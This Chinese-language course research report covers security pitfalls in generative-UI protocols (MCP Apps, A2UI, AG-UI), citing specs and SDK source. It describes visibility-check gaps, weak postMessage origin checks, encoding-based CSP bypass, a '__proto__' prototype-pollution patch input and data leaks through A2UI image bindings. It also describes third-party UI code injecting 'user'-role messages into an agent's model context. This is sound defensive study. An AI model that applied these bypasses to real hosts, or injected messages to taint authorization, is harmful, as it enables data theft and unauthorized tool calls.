# L16x 调研：生成式 UI 协议——MCP Apps、A2UI 与 AG-UI

> 调研日期：2026-10-12。学员画像：熟练 React + TS 前端工程师，已学完主线（含 L10 MCP、L14 注入与按参数来源授权、L16 Agent 的前端）。
> 置信度标注：[P] 一手直述 / [P2] 一手但需推断 / [S] 二手（只作线索，不支撑任何数字或结论）。
> 状态：**完成**（12 节 + 30 条反转 + /tmp 实测脚本齐全；稳定版口径：MCP Apps spec 2026-01-26、A2UI v0.9.1 稳定 / v1.0 候选、AG-UI 1.0）

## 0. 反转清单（INV-1…N）

格式：**常见认知 → 实际 → 一手出处**。括号里的 §指向正文详述与引文。这是全报告的索引，共 30 条。

**MCP Apps 协议与资源**

- **INV-1** 「UI 的 HTML 跟着工具结果一起返回」→ 不是。`ui://` 是**模板**资源，工具结果里只有 `_meta.ui.resourceUri` 指针；嵌入式 HTML 是被明确否决的备选方案。→ spec 2026-01-26 `ui://` 定义 + "rejected alternatives"（§2.2）`[P]`
- **INV-2** 「MCP Apps 的协议版本号就是 2026-01-26，SDK 2.0 = 协议 2.0」→ 否。`LATEST_PROTOCOL_VERSION = "2026-01-26"`，SDK 大版本与协议版本无关；上一轮调研写的 2026-06-26/08-05 是错的。→ 源码常量（§2.0）`[P]`
- **INV-3** 「有了 MCP Apps，L10 的那套握手就不用了」→ 不。iframe↔宿主是**第二条** JSON-RPC 传输（postMessage），L10 的 MCP 握手照旧，`ui/initialize` 是另一层握手。→ spec + `message-transport.ts`（§2.1/2.5）`[P]`
- **INV-4** 「工具结果一产生就能 postMessage 给 View」→ 必须缓冲到 View 发来 `notifications/initialized` 之后。→ spec par 时序 + AI SDK `pendingNotifications`（§2.5/§7.2）`[P]`
- **INV-5** 「审批前就能把工具入参交给 View 预热」→ OpenAI 曾这么做，2026-05-27 改成审批后才给；AI SDK 只在 input-available 之后发。→ Apps SDK changelog + `app-renderer.tsx`（§4.1/§7.2）`[P]`

**可见性（两个方向）**

- **INV-6** 「`visibility` 省略 = 对谁都不可见，安全」→ 反了，省略 = `["model","app"]`，**双向都可见**。→ spec visibility 规则（§2.3）`[P]`
- **INV-7** 「判 app-only 就是看数组里有没有 app」→ SDK 的 `isToolVisibilityAppOnly` 用 `length===1 && [0]==="app"`，`["app","app"]` 会判成 false。→ `app-bridge.ts` 源码 + 实测 T1（§2.3/§10.1）`[P]`
- **INV-8** 「View 能调它请求的任何工具」→ 只能调**同一个 server** 的、且 app 可见的工具；跨 server 必须拒。→ spec 同 server 规则（§2.3）`[P]`
- **INV-9** 「SDK 会挡住非法的 visibility（如字符串 "app"）」→ `@ai-sdk/mcp` 因 `String.prototype.includes` 把字符串 `"app"` 判成 app 可见。→ 实测 T1（§10.1）`[P]`
- **INV-10** 「`AppBridge.connect()` 会按可见性过滤 View 的工具调用」→ 不过滤，自动转发 `tools/call`（还转发 resources/list 等）。→ `app-bridge.ts` 2015–2021（§2.4）`[P]`

**浏览器原语**

- **INV-11** 「收 postMessage 查 origin 就够了」→ 生成式 UI 里要查 `source`（窗口引用）+ origin + 形状；ext-apps 的默认 transport 曾**只查 target 不查 source，接受任意窗口**。→ WHATWG + commit c7ef5f00（§3.3/§8.4）`[P]`
- **INV-12** 「开发时 origin 总是 'null'，把 'null' 加进白名单就行」→ 所有不透明源都序列化成同一个字符串 `"null"`，白名单含 `"null"` = 接受任何沙箱页。→ URL/HTML spec 不透明源（§3.2/§10.4 B2）`[P]`
- **INV-13** 「可以给不透明源的 frame 发 targetOrigin='null' 的消息」→ 浏览器抛 `SyntaxError: Invalid target origin 'null'`；对不透明源只能用 `"*"`。→ 实测 B3（§3.3/§10.4）`[P]`
- **INV-14** 「srcdoc 子文档是独立 origin / 没有 CSP」→ srcdoc **继承**创建者的 origin 和 CSP（快照），`event.origin` 是宿主源不是 null。→ CSP3 继承 + 实测 origin 组/CSP 组（§3.4/§10.4）`[P]`
- **INV-15** 「加载后改 iframe 的 sandbox 属性能收紧它」→ 只在**下一次导航**生效；`document.write` 不是导航，basic-host 正是这么写内层的。→ WHATWG + 实测 B6（§3.1/§10.4）`[P]`
- **INV-16** 「`allow-scripts + allow-same-origin` 永远危险」→ 只在**同源**嵌入时等于没沙箱；跨源嵌入时这组 flag 仍安全。→ WHATWG 原文 "when the embedded page has the same origin" + 实测 B1/B1b（§3.1）`[P]`
- **INV-17** 「`allow="camera microphone"` 能开两个权限」→ 空格分隔整条失效，必须用 `;`；规范示例文本恰好拼错成空格。→ Permissions Policy ABNF + 实测 B4（§2.9/§3.5/§10.4）`[P]`

**CSP**

- **INV-18** 「CSP source 做字符串黑名单删危险字符就安全」→ 要先 `new URL()` 规范化（解码 `%3B`）再查分隔符；SDK 正是这么做，regex 删字符会被编码绕过。→ `sandbox.ts` + 实测 T2（§2.8/§10.2）`[P]`
- **INV-19** 「不声明 CSP 和声明空 CSP 差不多」→ `getMCPAppCSP(undefined)` 返回 undefined（无策略），`getMCPAppCSP({})` 返回完整限制策略；不声明约束更少。→ 实测 T2（§7.2/§10.2）`[P]`；规范要求省略时宿主用限制性默认（§2.8）
- **INV-20** 「`default-src 'none'` 把一切都关了」→ `form-action`、`base-uri` 是导航指令，不回退到 default-src；必须单独写。→ CSP3 §6.4 + 实测 E4（§8.2/§10.4）`[P]`/`[P2]`

**JSON Patch / 状态（AG-UI）**

- **INV-21** 「patch 逐条应用，失败就停在哪算哪」→ RFC 6902：整份 patch 要么全成功要么不算成功；必须对副本应用、失败回滚。→ RFC 6902 §5 + 实测 T3（§6.2/§10.3）`[P]`
- **INV-22** 「JSON Pointer 的 `~0`/`~1` 先解哪个都行」→ 必须先 `~1`→`/` 再 `~0`→`~`，否则 `~01` 解错。→ RFC 6901 §4 + 实测（§6.2/§10.3）`[P]`
- **INV-23** 「`test` 用语言的 == 比较值」→ RFC 6902 §4.6 要求「同 JSON 类型」；Python `True == 1`、`1 == 1.0` 为真会判错。→ RFC + 实测两语言 T3（§6.2/§10.3）`[P]`
- **INV-24** 「数组下标用 parseInt」→ RFC 6901 ABNF 禁前导零/`1e0`/空白；`parseInt` 会接受。→ RFC 6901 + 实测（§6.2/§10.3）`[P]`
- **INV-25** 「patch 用 `obj[key]=v` 写就行」→ `{"op":"add","path":"/__proto__/x"}` 会污染 `Object.prototype`；AG-UI 的依赖 `fast-json-patch` 历史上就因此被登记 advisory，安全靠库的默认开关。→ GHSA-8gh8-hqwg-xf34 + 实测 T3（§6.2/§8.4/§10.3）`[P]`
- **INV-26** 「通过了 AG-UI 的 schema 校验就能应用」→ schema 只管结构；能不能应用（指针是否解析、move 是否进子节点）是 applier 的事，协议明说 "a runtime question RFC 6902 leaves to the applier"。→ AG-UI 文档原文（§6.2）`[P]`
- **INV-27** 「前端工具调用返回 = agent 还没结束」→ AG-UI 里前端工具意味着一次**成功结束**的 run（带 `pendingToolCallIds`），resume 是**新的 run**；未知 outcome 读作 success。→ AG-UI 1.0 文档（§6.4）`[P]`

**A2UI**

- **INV-28** 「A2UI 不执行代码所以不会外泄」→ `Image.url` 可用 `formatString('${/form}')` 绑定数据，渲染即发请求、每次按键再发；文档同时写着 "No code execution risk"。→ basic catalog + common_types + 绑定语义（§5.5）`[P]`/`[P2]`
- **INV-29** 「`catalogId` 长得像 URL，应该去 fetch 它」→ 规范明说 "a string identifier, not a resolvable URI … does not need to point to any deployed resource"；目录必须是本地审过的。→ a2ui_protocol.md（§5.4）`[P]`
- **INV-30** 「组件树是 JSON 所以天然无环」→ A2UI 是**邻接表**，可成环/多父，规范对环只字未提（grep 零命中），朴素递归渲染器会栈溢出。→ a2ui_protocol.md + grep（§5.3）`[P]`

## 1. 与 L10 / L14 / L16 的边界

L16x 是 L16 之后的深选修，面向已经熟 React / TS / iframe / postMessage / CSP / 同源策略的工程师。**所以本报告不讲前端基础**，只讲三件事：生成式 UI 协议在这些原语之上**新增**了什么、这些工程师的**直觉会在哪里被带偏**、以及它怎么接上主线已有的欠条。

- **接 L10（MCP）**：L10 讲过 server/client/工具/资源、2026-07-28 的握手精简。L16x **只加三样**：工具上的 `_meta.ui`、`ui://` 这类**模板**资源、以及 iframe↔宿主的**第二条** postMessage 传输。不复述 MCP 基础；核心新意是「资源变模板、View 变成第二个 client」（§2）。
- **接 L14（注入 / 按参数来源授权）**：L14 给了「按参数来源决定授权」。L16x 新增**一个来源——`app`**：第三方 UI 代码发起的 `tools/call`、`ui/message`、`update-model-context`，既不是用户也不是模型，却能进工具、进「用户消息」、进模型上下文（§8.1）。不复述注入原理；核心新意是「把第三方 UI 当成默认不可信的新参数来源，且它还能画出以假乱真的确认框」。
- **接 L16（Agent 的前端）**：L16 给了「渲染即发送」「决策权在模型、渲染权在你」「四种中断」「半截 JSON」。L16x 把它们各推进一步：「渲染即发送」进入**声明式**世界（A2UI 不执行代码也能外泄，§5.5）；「决策权/渲染权」对到三种协议的不同答案（MCP Apps = server 自带渲染器、A2UI = 宿主自带渲染器、Vercel = 零协议，§5.1/§7）；「中断」对到 AG-UI 的 interrupt/resume（§6.4）。不复述 SSE 分帧——那是 L16 `wire.ts` 的内容，L16x 的 lab 明确不碰（§11.7）。

一句话定位：**L16 教你安全地渲染 agent 流式输出的文本与工具调用；L16x 教你安全地渲染 agent（或第三方 server）提供的、可交互的 UI——而这把「渲染权」要么交给了第三方代码（MCP Apps），要么留给了你但多了一层数据绑定的外泄面（A2UI）。**

## 2. MCP Apps（SEP-1865 / ext-apps）

> 一手来源：`github.com/modelcontextprotocol/ext-apps`，浅克隆 commit `82221c0c8ce7661efa6771c9d461511b1650495f`（2026-09-25），访问 2026-10-12。
> 规范文件：`specification/2026-01-26/apps.mdx`（59,181 字节，稳定版）与 `specification/draft/apps.mdx`（90,146 字节，草案）。下文凡未注明「draft」的引文都来自 2026-01-26 稳定版。
> SDK：`@modelcontextprotocol/ext-apps`，npm 当前 `2.0.3`（2026-09-25 发布）；`1.0.0` 发布于 `2026-01-26T17:34:44Z`，与规范日期同日。`npm view @modelcontextprotocol/ext-apps time`，访问 2026-10-12 `[P]`。

### 2.0 先纠正上一轮调研的一个版本号

`research/L16-agent-frontend.md` 的 INV-44 / A.4 写的是「MCP Apps Protocol version `2026-06-26`，Superseded by `2026-08-05`」。**仓库里不存在这两个日期的规范目录。** `specification/` 下只有两个目录：

```text
specification/2026-01-26/apps.mdx
specification/draft/apps.mdx
```

稳定版的状态行是：

> "**Status:** Stable (2026-01-26)"
> —— `specification/2026-01-26/apps.mdx` 第 9 行 `[P]`

SDK 里写死的协议版本常量也是它：

> `export const LATEST_PROTOCOL_VERSION = "2026-01-26";`
> —— `src/spec.types.ts` 第 29 行 `[P]`

而 2.x 的大版本号**不是协议版本**：

> "The MCP Apps wire protocol did not change; the breaking changes are in dependencies and in the TypeScript API."
> "The `ui/*` messages exchanged over the iframe channel are byte-identical to 1.x."
> —— `docs/migrate-to-2.md` `[P]`

上一轮那两个日期我追不到来源，可能把 MCP 核心规范或别的扩展的版本串进来了。**L16x 一律以 `2026-01-26` 为准**，并在课上点明「SDK 2.0 ≠ 协议 2.0」。（另：上一轮写「`@ag-ui/core 0.0.59`，[S]」，npm 当前是 `1.0.2`，见第 6 节。）

### 2.1 它是什么：一句话

> "MCP Apps introduces a standardized pattern for declaring UI resources via the `ui://` URI scheme, associating them with tools through metadata, and facilitating bidirectional communication between the UI and the host using MCP's JSON-RPC base protocol."
> —— Abstract `[P]`

四个组成部分："**UI Resources:** Predeclared resources using the `ui://` URI scheme / **Tool-UI Linkage:** Tools reference UI resources via metadata / **Bidirectional Communication:** UI iframes communicate with hosts using standard MCP JSON-RPC protocol / **Security Model:** Mandatory iframe sandboxing with auditable communication" `[P]`。

扩展标识 `io.modelcontextprotocol/ui`，靠 extensions 能力协商（"As an extension, MCP Apps is optional and must be explicitly negotiated" `[P]`）：

```json
{ "capabilities": { "extensions": { "io.modelcontextprotocol/ui": { "mimeTypes": ["text/html;profile=mcp-app"] } } } }
```

**和 L10 的接口**：L10 讲 2026-07-28 删掉了 host↔server 的 `initialize` 握手。但 iframe↔host 这一段有一套**自己的、强制的** `ui/initialize` 握手（见 §2.5）——两件事不要混。`[P2]`（2026-01-26 规范早于 2026-07-28 修订，正文未讨论无握手模式下 extensions 能力如何携带；无 ext-apps 一手说明，列入 §12「无一手来源」。）

### 2.2 `ui://` 资源：模板，不是结果

```ts
interface UIResource {
  uri: string;          // MUST use the `ui://` URI scheme
  name: string;
  description?: string;
  mimeType: string;     // SHOULD be `text/html;profile=mcp-app`
  _meta?: { ui?: UIResourceMeta }
}
```

`resources/read` 里的硬要求：

> "- URI MUST start with `ui://` scheme
> - `mimeType` MUST be `text/html;profile=mcp-app` (other types reserved for future extensions)
> - Content MUST be provided via either `text` (string) or `blob` (base64-encoded)
> - Content MUST be valid HTML5 document" `[P]`

**前端直觉会走错的一点：「UI 是工具结果的一部分」。** 不是——工具结果里**没有 HTML**。HTML 是预先声明、宿主可提前抓取审查的**模板**，工具结果只是喂模板的数据。规范把「HTML 嵌在工具结果里」列为**被否决方案**（"**Embedded resources:** … deferred due to the gaps in performance optimization and the challenges in the UI review process" `[P]`），并允许宿主预取缓存。

后果是一个安全性质：**模型的输出决定不了 HTML 长什么样**。模型最多决定调哪个工具、填什么参数（L16「决策权在模型、渲染权在你」），渲染成哪段 HTML 是 server 在 `tools/list` 时定死的（"Host can review UI templates during connection setup" `[P]`）。但它**只把渲染权从模型手里拿走、交给了 MCP server，不是你**——第三方 server 的 HTML 仍是不可信代码。这是和 L16 第七节最大的区别：L16 的预注册组件是你写的，MCP Apps 的预注册模板是**别人写的**，所以沙箱强制。

**`ui://` 不是浏览器能懂的 scheme**，宿主用 `resources/read` 换成 HTML 字符串再塞进 iframe；你**不能**把它填进 `iframe.src`。于是 View 的 origin 由宿主怎么加载这段字符串决定（srcdoc / document.write / 专用子域），不由 URI 决定（§2.7、§3）。`[P2]`

### 2.3 工具绑定：`_meta.ui.resourceUri` 与 `_meta.ui.visibility`

```ts
interface McpUiToolMeta {
  /** URI of UI resource for rendering tool results */
  resourceUri?: string;
  /**
   * Who can access this tool. Default: ["model", "app"]
   * - "model": Tool visible to and callable by the agent
   * - "app": Tool callable by the app from this server only
   */
  visibility?: Array<"model" | "app">;
}
```

扁平写法已弃用：

> "The flat `_meta["ui/resourceUri"]` format is deprecated. Use `_meta.ui.resourceUri` instead. The deprecated format will be removed before GA." `[P]`

可见性的全部规则（这一段是 lab 里最值钱的几条断言的来源，逐字保留）：

> "- `visibility` defaults to `["model", "app"]` if omitted
> - `"model"`: Tool is visible to and callable by the agent
> - `"app"`: Tool is callable by the app from the same server connection only
> - **tools/list behavior:** Host MUST NOT include tools in the agent's tool list when their visibility does not include `"model"` (e.g., `visibility: ["app"]`)
> - **tools/call behavior:** Host MUST reject `tools/call` requests from apps for tools that don't include `"app"` in visibility
> - Cross-server tool calls are always blocked for app-only tools" `[P]`

为什么是一个数组而不是两个布尔：

> "Cleaner than OpenAI's two-field approach (`widgetAccessible` + `visibility`)"
> "**Boolean `private` flag:** Simpler but less flexible; doesn't express model-only tools." `[P]`

**三条容易写错的推论**（全部由上面的规则直接推出，`[P2]`）：

1. **判据是 `includes`，不是「长度为 1 且等于」。** 规则写的是 "does not include `"model"`"。所以 `[]`（空数组）意味着**模型和 app 都不能用**；`["app","app"]` 是 app-only。
2. **两个方向各自独立。** 「对模型隐藏」和「对 app 开放」是两个判断，不是一个开关的两面。`["model"]` 的工具 **app 不能调**——这一条最容易被忘，因为大家只记得「app-only 工具对模型隐藏」。
3. **app 能调的只有同一个 server 连接上的工具。** "from the same server connection only" + "Cross-server tool calls are always blocked"。宿主同时连着五个 server 时，View A 不能借宿主之手调 server B 的工具。

**而官方 SDK 自己的辅助函数恰好是「长度为 1 且等于」的写法**：

```ts
export function isToolVisibilityAppOnly(tool: Partial<Tool>): boolean {
  const uiMeta = tool._meta?.ui as McpUiToolMeta | undefined;
  const visibility = uiMeta?.visibility;
  if (!visibility) return false;
  if (visibility.length === 1 && visibility[0] === "app") return true;
  return false;
}
```
> —— `src/app-bridge.ts` 第 165–172 行 `[P]`

这个函数名叫 "AppOnly"，它对 `["app"]` 的回答是对的；但如果宿主用 `!isToolVisibilityAppOnly(t)` 当作「该不该给模型看」的过滤器，`[]` 和 `["app","app"]` 都会漏给模型。官方 basic-host 示例**没有**这么用，它用的是 `includes`：

> ```ts
> function isToolVisibleToModel(tool: { _meta?: Record<string, unknown> }): boolean {
>   const result = McpUiToolMetaSchema.safeParse(tool._meta?.ui);
>   if (!result.success) return true; // default: visible to model
>   const visibility = result.data.visibility;
>   if (!visibility) return true; // default: visible to model
>   return visibility.includes("model");
> }
> ```
> —— `examples/basic-host/src/index.tsx` 第 13–19 行 `[P]`

注意第一行：**`_meta.ui` 解析失败时按「对模型可见」处理（fail-open）**。在「给模型看」这个方向上 fail-open 后果有限（最坏是模型多看到一个工具）；但同一个思路如果搬到「app 能不能调」那个方向，就是一个越权。lab 的 TODO 要求两个方向**分别**写、并且 app 方向 fail-closed。

### 2.4 SDK 的自动转发**不执行**可见性规则（本节最承重的源码事实之一）

规范：「Host MUST reject `tools/call` requests from apps for tools that don't include `"app"` in visibility」。

SDK 里 `AppBridge` 有一个便捷构造方式——把 MCP client 传进去，它就自动把 View 的请求转发给 server：

> "@param _client - MCP client connected to the server, or `null`. When provided, {@link connect `connect`} will automatically set up forwarding of MCP requests/notifications between the View and the server." `[P]`

而这段自动转发的实现是：

```ts
if (serverCapabilities.tools) {
  this.oncalltool = async (params, extra) => {
    return this._client!.request(
      { method: "tools/call", params },
      { signal: extra.mcpReq.signal },
    );
  };
```
> —— `src/app-bridge.ts` `connect()`，第 2015–2021 行 `[P]`

**没有任何可见性检查。** View 发 `tools/call { name: "delete_project" }`，哪怕 `delete_project` 是 `visibility: ["model"]`，它也会被原样转发到 server。官方 basic-host 用的正是这种构造（`new AppBridge(serverInfo.client, IMPLEMENTATION, {...})`，`examples/basic-host/src/implementation.ts` 第 287 行），且整个 basic-host 里 `visibility` 只出现在「给模型列工具」那一处。`[P]`

另外，自动转发还挂上了 `resources/list`、`resources/templates/list`、`prompts/list`（第 2029–2068 行），而稳定版规范列出的 View 可用标准消息只有四个：

> "**Tools:** - `tools/call` … **Resources:** - `resources/read` … **Notifications:** - `notifications/message` … **Lifecycle:** - `ui/initialize` → `ui/notifications/initialized` … - `ping`" `[P]`

`[P2]` 结论：**规范把「拒绝」写成了宿主的 MUST，SDK 把它留给了宿主自己写。** 你用 SDK 的便捷路径，就默认没满足这条 MUST。这正是 lab 的「宿主桥」要求学员自己写方法白名单 + 可见性闸门、并在 verify 里用一个 `["model"]` 工具去敲门的理由。（这不是 SDK 的 bug 报告——SDK 文档说的是「forwarding」，没承诺过「enforcement」；但它是一个非常典型的「看起来对、实际错」的集成方式。）

### 2.5 iframe↔宿主：JSON-RPC over postMessage

> "MCP Apps uses JSON-RPC 2.0 over `postMessage` for iframe-host communication." `[P]`
> "Conceptually, UI iframes act as MCP clients, connecting to the host via a `postMessage` transport" `[P]`
> "Hosts act as MCP servers (that can proxy the actual MCP server), receiving and handling requests from UI iframes." `[P]`

**角色反转**：在 host↔server 那一段，宿主是 MCP **client**；在 iframe↔host 这一段，宿主是 MCP **server**，View 是 client。一个宿主同时扮演两个角色，中间是它自己的策略层。规范为什么不用一个 `window.openai` 那样的全局对象：

> "**Global API object:** Rejected because it requires host-specific injection and doesn't work with external iframe sources." `[P]`

#### 完整方法表（2026-01-26 稳定版）

| 方向 | 方法 | 类型 | 规范要点 |
|---|---|---|---|
| View→Host | `ui/initialize` | request | 必须带 `appCapabilities` |
| View→Host | `ui/notifications/initialized` | notification | 宿主收到它之前**不得**向 View 发任何东西 |
| View→Host | `tools/call` | request | 宿主转发给 server；受 visibility 约束 |
| View→Host | `resources/read` | request | 宿主转发 |
| View→Host | `notifications/message` | notification | 日志 |
| 双向 | `ping` | request | 健康检查 |
| View→Host | `ui/open-link` | request | "Host SHOULD open the URL in the user's default browser or a new tab." |
| View→Host | `ui/message` | request | 往聊天里塞一条消息，`role: "user"` |
| View→Host | `ui/request-display-mode` | request | inline / fullscreen / pip，宿主返回**实际**模式 |
| View→Host | `ui/update-model-context` | request | 覆盖式更新「下一轮给模型看的上下文」 |
| View→Host | `ui/notifications/size-changed` | notification | `{width, height}` |
| Host→View | `ui/notifications/tool-input` | notification | 完整参数，**最多一次**，必须先于 tool-result |
| Host→View | `ui/notifications/tool-input-partial` | notification | 0..n 次，流式参数的「修复版」 |
| Host→View | `ui/notifications/tool-result` | notification | `CallToolResult` |
| Host→View | `ui/notifications/tool-cancelled` | notification | 任何原因的取消都要发 |
| Host→View | `ui/notifications/host-context-changed` | notification | `Partial<HostContext>`，View 自己合并 |
| Host→View | `ui/resource-teardown` | **request** | 拆除前通知，宿主 SHOULD 等回应 |
| Proxy→Host | `ui/notifications/sandbox-proxy-ready` | notification | 仅 Web 宿主的双层 iframe |
| Host→Proxy | `ui/notifications/sandbox-resource-ready` | notification | `{html, sandbox?, csp?, permissions?}` |

（`src/spec.types.ts` 里另有 `ui/download-file`、`ui/notifications/request-teardown`，以及 draft 里的 `sampling/createMessage`、双向 `tools/list`——这些**不在 2026-01-26 稳定版**，见 2.10。）

#### 初始化流程（时序，规范原文）

> "The Host MUST NOT send any request or notification to the View before it receives an `initialized` notification." `[P]`
> "`ui/notifications/tool-input` - Host MUST send this notification with the complete tool arguments after the View's initialize request completes." `[P]`
> "This notification is sent at most once and is required before sending `ui/notifications/tool-result`." `[P]`
> "Host MUST send this notification when tool execution completes (if the View is displayed during tool execution)." `[P]`

所以一个合规宿主的状态机是：

```text
iframe 加载 ─▶ View: ui/initialize ─▶ Host: InitializeResult(hostContext, hostCapabilities)
           ─▶ View: ui/notifications/initialized
           ─▶ Host: tool-input-partial × 0..n ─▶ tool-input × 1 ─▶ tool-result | tool-cancelled
```

**前端直觉会走错的一点：「工具调用和 iframe 加载是串行的」。** 规范的时序图里它们是 `par`（并行）：

> ```
> par UI Tool call
>   H ->> S: tools/call to Tool with _meta.ui metadata
> and UI initialization
> ```
> —— Lifecycle §2 `[P]`

所以工具结果**可能比 View 的 `initialized` 先到**。宿主必须把它**缓冲**起来，等 `initialized` 之后再按 `tool-input → tool-result` 的顺序补发；直接 `postMessage` 过去要么丢、要么违反 MUST NOT。这是 lab 里「桥的出站队列」那个 TODO 的来源。`[P2]`

#### 工具结果怎么送进去：`content` vs `structuredContent` vs `_meta`

> "- `content`: Text representation for model context and text-only hosts
> - `structuredContent`: Structured data optimized for UI rendering (not added to model context)
> - `_meta`: Additional metadata (timestamps, version info, etc.) not intended for model context" `[P]`

> "Tools MUST return meaningful content array even when UI is available" `[P]`

**这是一个会让人意外的信息流分叉**：同一个工具结果，模型看 `content`，View 看全部（`content` + `structuredContent` + `_meta`）。也就是说 **View 能看到模型看不到的数据**。两个后果：

- **对 UI 正确性**：别指望模型「知道」它在界面上展示了什么——模型只看到 `content` 那段文字。用户说「把第三行删掉」时，模型手里可能根本没有第三行。这就是 `ui/update-model-context` 存在的理由（见下）。
- **对安全**：`structuredContent` 不进模型上下文，**所以不会被模型复述，但会被 View 渲染**——渲染即发送（L16 第八节）照样适用，而且这一路不经过任何「模型输出过滤器」。`[P2]`

#### 流式参数：规范**明文认可**「补全成合法 JSON」，但只许展示

L16 第一节说「补全一个被截断的参数是最糟的选择」。MCP Apps 规范在 `tool-input-partial` 上的写法初看正好相反：

> "The arguments object represents best-effort recovery of incomplete JSON, with unclosed structures automatically closed to produce valid JSON."
> "- MAY parse the agent's partial JSON output by closing unclosed brackets/braces" `[P]`

但紧跟着的 View 侧约束把它限定死了：

> "- MAY ignore these notifications entirely
> - MAY render progressive loading/streaming states based on available fields
> - MUST NOT rely on partial arguments for critical operations
> - SHOULD gracefully handle missing or changing fields between notifications" `[P]`

**这不是矛盾，是 L16「能展示 ≠ 能执行」在协议层的官方表述**：补全用于展示，`tool-input`（完整参数，最多一次）才是唯一可执行的版本。这一条做成 INV，因为学员很可能把 L16 的教训过度推广成「永远不许补全」。

#### UI 发起的工具调用：宿主该做什么

规范给宿主的权限很宽（"The Host MAY forward any message … for any method that doesn't start with `ui/` … it MAY decide to block some messages or subject them to further user approval" `[P]`），同时在威胁模型里点名 "View attempts unauthorized tool execution / View exfiltrates sensitive host data" `[P]`。由此，宿主对 View 的 `tools/call` 应依次：方法白名单 → `name` 属于**这个 View 所属的 server** → visibility 含 `"app"` → 按 L14 把参数来源标为 `app` → 按策略执行/弹确认 → 记审计。`[P2]`（§8 接 L14。）

#### `ui/message` 与 `ui/update-model-context`：从 iframe 通往模型上下文的两条路

> "`ui/message` - Send message content to the host's chat interface"
> "params: { role: "user", content: { type: "text", text: string } }"
> "Host behavior: * Host SHOULD add the message to the conversation context, preserving the specified role. * Host MAY request user consent." `[P]`

> "The View MAY send this request to update the Host's model context. This context will be used in future turns. Each request overwrites the previous context sent by the View."
> "- If multiple updates are received before the next user message, Host SHOULD only send the last update to the model" `[P]`

**这两条是本节对 L14 最直接的冲击**：第三方 HTML 可以往对话里塞一条 **`role: "user"`** 的消息，而规范对用户同意只写了 MAY。宿主若照 "preserving the specified role" 原样入史，后续任何「用户说过可以」的授权判断都会被它污染。`[P2]` lab 断言：来自 View 的消息内部必须带 `source: "app"`（SDK 文档示例也是 `addMessage({ role, content, source: "app" })`，`app-bridge.ts:806` `[P]`）。

#### 尺寸变化

跨源 iframe 的内容高度宿主读不到（同源策略），所以高度必须由 View **报告**、宿主**照办**（"hosts MUST listen for `ui/notifications/size-changed` … and update the iframe dimensions accordingly" `[P]`）——**尺寸是一个由不可信方提供的数字**。`maxHeight` 是宿主告诉 View 的，View 报回来的 `height` 可以不遵守。basic-host 设 `maxHeight: 6000`，并处理 `border-box` 的「反馈回路」。`[P]` 宿主必须 clamp（`min(reported, maxHeight)`，拒绝 `NaN`/负/非有限）：一个 `height: 1e9` 就能把宿主 UI 挤出视口，是 clickjacking 的素材（§8）。`[P2]`

#### 拆除

`ui/resource-teardown` 名为 notification 但带 `id`/result——**实际是 request**（"Host SHOULD wait for a response before tearing down … to prevent data loss" `[P]`）。宿主「等回应」必须有超时，否则永不回应的 View 能把宿主卡住。规范没给超时值——**无一手数字**。

### 2.6 宿主上下文与主题：76 个变量和一个 CSS 注入面

`hostContext` 里有 `toolInfo / theme / styles / displayMode / availableDisplayModes / containerDimensions / locale / timeZone / userAgent / platform / deviceCapabilities / safeAreaInsets`。

主题变量是封闭枚举（release notes 说 "36 standardized CSS variables"，0.2.2；稳定版规范 `McpUiStyleVariableKey` 的列表实际是 **76** 个键名（含 typography/radius/shadow；`sed -n 797,889p … | grep -c '| "--'` 实数），以规范为准）。`[P]`

一个容易忽视的点：`styles.css.fonts` 是**宿主→View 的任意 CSS 字符串**（"can contain `@font-face` rules … `@import` statements for font services like Google Fonts" `[P]`）。方向是可信→不可信，不是宿主的风险；但它和 View 的 CSP 冲突：`@import url('https://fonts.googleapis.com/...')` 需 `style-src`/`font-src` 放行，而 View 的 CSP 只放行 server 声明的 `resourceDomains`。规范没说宿主注入的字体源是否自动进 CSP。`[P2]`——这是「宿主主题在某些 View 里不生效」的可预见原因。

另外 `hostContext.userAgent / locale / timeZone / platform` 是**宿主主动交给第三方代码的指纹信息**。规范里是 SHOULD 提供。`[P]` 对隐私敏感的宿主应当按需裁剪。`[P2]`

### 2.7 强制沙箱与双层 iframe 代理

> "All View content MUST be rendered in sandboxed iframes with restricted permissions." `[P]`

Web 宿主额外必须用双层结构：

> "If the Host is a web page, it MUST wrap the View and communicate with it through an intermediate Sandbox proxy.
> 1. The Host and the Sandbox MUST have different origins.
> 2. The Sandbox MUST have the following permissions: `allow-scripts`, `allow-same-origin`.
> 3. The Sandbox MUST send a `ui/notifications/sandbox-proxy-ready` notification …
> 4. Once the Sandbox is ready, the Host MUST send the raw HTML resource …
> 5. The Sandbox MUST load the raw HTML of the View with CSP settings that: …
> 6. The Sandbox MUST forward messages sent by the Host to the View, and vice versa, for any method that doesn't start with `ui/notifications/sandbox-`. …
> 7. The Sandbox SHOULD NOT create/send any requests to the Host or to the View (this would require synthesizing new request ids)." `[P]`

（draft 版把第 3、4 条从 MUST 降为 SHOULD。`[P]`）

**第 2 条会让懂沙箱的前端工程师一愣**：`allow-scripts` + `allow-same-origin` 不是「等于没沙箱」吗？第 3 节会给 WHATWG 原文——那条警告的前提是**被嵌入内容与嵌入者同源**。第 1 条（不同源）正是让第 2 条安全的前提：沙箱代理拿到的「同源」是**它自己的**源（例如 `*.claudemcpcontent.com`），不是宿主的源。**两条 MUST 必须一起读，单独读第 2 条是错的。**

而官方参考实现里**内层 iframe 也是这个组合**，并且用 `document.write` 写入 HTML：

```ts
const inner = document.createElement("iframe");
inner.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms");
...
// Use document.write instead of srcdoc (which the CesiumJS Map won't work with)
const doc = inner.contentDocument || inner.contentWindow?.document;
if (doc) { doc.open(); doc.write(html); doc.close(); }
else { inner.srcdoc = html; }
```
> —— `examples/basic-host/src/sandbox.ts` `[P]`

`[P2]` 后果：**内层 View 与外层代理同源**，且带 `allow-scripts allow-same-origin`——所以内层的 sandbox 属性对内层自己没有约束力：View 能访问 `parent.document`、删自己的 `sandbox`、在代理 realm 里执行代码。**真正的边界是代理的 origin（≠ 宿主 origin），不是内层的 sandbox 属性。** 宿主必须把「来自代理窗口的一切消息」当成 View 直接发的；代理里的过滤只是正确性辅助，不是安全边界（§10 实测）。

代理侧的校验（全仓库 origin/source 校验最完整的一处，值得原样给学员看）：

```ts
window.addEventListener("message", async (event) => {
  if (event.source === window.parent) {
    if (event.origin !== EXPECTED_HOST_ORIGIN) { /* reject */ return; }
    ...
  } else if (event.source === inner.contentWindow) {
